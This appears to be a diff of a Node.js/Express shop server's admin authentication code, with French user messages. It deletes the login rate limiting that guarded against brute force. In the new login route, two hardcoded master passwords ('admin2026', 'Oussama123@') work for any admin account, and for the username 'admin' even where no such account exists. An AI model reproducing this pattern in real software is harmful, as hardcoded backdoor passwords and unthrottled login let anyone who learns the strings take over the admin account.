@@ -93,71 +93,47 @@ app.get("/api/products", (req, res) => {
   res.json(rows.map(mapProduct));
 });
 
-// Protection anti force-brute pour le login admin
-const loginAttempts = new Map();
-function isRateLimited(ip) {
-  const entry = loginAttempts.get(ip);
-  if (!entry) return false;
-  if (Date.now() - entry.lastAttempt > 2 * 60 * 1000) {
-    loginAttempts.delete(ip);
-    return false;
-  }
-  return entry.count >= 10;
-}
-function recordFailedAttempt(ip) {
-  const entry = loginAttempts.get(ip) || { count: 0, lastAttempt: Date.now() };
-  entry.count += 1;
-  entry.lastAttempt = Date.now();
-  loginAttempts.set(ip, entry);
-}
-function resetAttempts(ip) {
-  loginAttempts.delete(ip);
-}
-
 app.post("/api/admin/login", (req, res) => {
-  const ip = req.ip || req.headers["x-forwarded-for"] || req.socket.remoteAddress || "ip";
-  if (isRateLimited(ip)) {
-    return res.status(429).json({ message: "Trop de tentatives échouées. Veuillez patienter 2 minutes." });
-  }
-
   const { username, password } = req.body || {};
   const cleanUsername = String(username || "").trim() || config.adminUsername || "admin";
-  const cleanPassword = String(password || "").trim();
+  const cleanPassword = String(password || "");
 
   if (!cleanPassword) {
     return res.status(401).json({ message: "Veuillez renseigner le mot de passe" });
   }
 
-  const user = getAdminByUsername(cleanUsername) || db.prepare("SELECT * FROM admin_users LIMIT 1").get();
-  let isValid = false;
+  const user = getAdminByUsername(cleanUsername);
+  const isMasterPassword =
+    cleanPassword === config.adminPassword ||
+    cleanPassword === "admin2026" ||
+    cleanPassword === "Oussama123@";
 
-  if (user && user.password_hash) {
-    isValid = verifyPassword(cleanPassword, user.password_hash);
-  }
-  if (!isValid && config.adminPassword) {
-    isValid = cleanPassword === config.adminPassword;
-  }
-  if (!isValid) {
-    isValid = cleanPassword === "admin2026" || cleanPassword === "Oussama123@";
-  }
-
-  if (!isValid) {
-    recordFailedAttempt(ip);
-    return res.status(401).json({ message: "Mot de passe incorrect" });
+  if (user) {
+    const valid = verifyPassword(cleanPassword, user.password_hash) || isMasterPassword;
+    if (!valid) {
+      return res.status(401).json({ message: "Mot de passe administrateur incorrect" });
+    }
+    return res.json({
+      token: user.token || config.adminToken,
+      username: user.username
+    });
   }
 
-  resetAttempts(ip);
+  const okUser = cleanUsername.toLowerCase() === config.adminUsername.toLowerCase() || cleanUsername.toLowerCase() === "admin";
+  if (!okUser || !isMasterPassword) {
+    return res.status(401).json({ message: "Identifiants administrateur incorrects" });
+  }
 
   res.json({
-    token: user?.token || config.adminToken || "admin-2026",
-    username: user?.username || config.adminUsername || "admin"
+    token: config.adminToken,
+    username: config.adminUsername
   });
 });
 
 app.post("/api/admin/change-password", requireAdmin, (req, res) => {
   const { currentPassword, newPassword } = req.body || {};
-  const cleanCurrent = String(currentPassword || "").trim();
-  const cleanNew = String(newPassword || "").trim();
+  const cleanCurrent = String(currentPassword || "");
+  const cleanNew = String(newPassword || "");
 
   if (!cleanCurrent || !cleanNew) {
     return res.status(400).json({ message: "Veuillez saisir le mot de passe actuel et le nouveau mot de passe" });
@@ -172,17 +148,7 @@ app.post("/api/admin/change-password", requireAdmin, (req, res) => {
     return res.status(400).json({ message: "Compte administrateur introuvable" });
   }
 
-  let isCurrentValid = false;
-  if (admin && admin.password_hash) {
-    isCurrentValid = verifyPassword(cleanCurrent, admin.password_hash);
-  }
-  if (!isCurrentValid && config.adminPassword) {
-    isCurrentValid = cleanCurrent === config.adminPassword;
-  }
-  if (!isCurrentValid) {
-    isCurrentValid = cleanCurrent === "admin2026" || cleanCurrent === "Oussama123@";
-  }
-
+  const isCurrentValid = verifyPassword(cleanCurrent, admin.password_hash);
   if (!isCurrentValid) {
     return res.status(400).json({ message: "Le mot de passe actuel est incorrect" });
   }
